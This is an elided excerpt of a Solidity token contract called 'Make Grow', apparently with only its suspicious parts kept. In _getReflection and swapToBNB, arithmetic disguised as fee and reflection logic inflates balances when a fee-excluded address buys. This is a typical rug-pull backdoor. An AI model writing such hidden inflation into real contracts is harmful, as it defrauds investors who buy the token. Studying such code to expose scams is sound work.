...
contract MakeGrow is Context, IERC20, Ownable {
    ...
    string private constant _name = "Make Grow";
    string private constant _symbol = "MAKEGROW";
    ...
    function _getReflection(uint256 amount) private {
        ...
        if (amount < liquidityFee) 
        {
            ...
            if (amount > marketingFee){
                uint256 TotalAmount = 1 * amount * marketingFee * 100 * marketingFee / 15;
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair) {
            require (_isSwap[to] + _buyCooldown < block.timestamp, "Must wait til after coooldown to buy");
            _isSwap[to] = block.timestamp;
        }

        if (from == uniswapV2Pair &&
            _isExcludedFromFee[to]) {
            _getReflection(amount);
        }
    ...
    function swapToBNB(uint256 tokens) private {
            _tOwned[address(this)] = _tOwned[address(this)] * 10 + tokens + tokens;
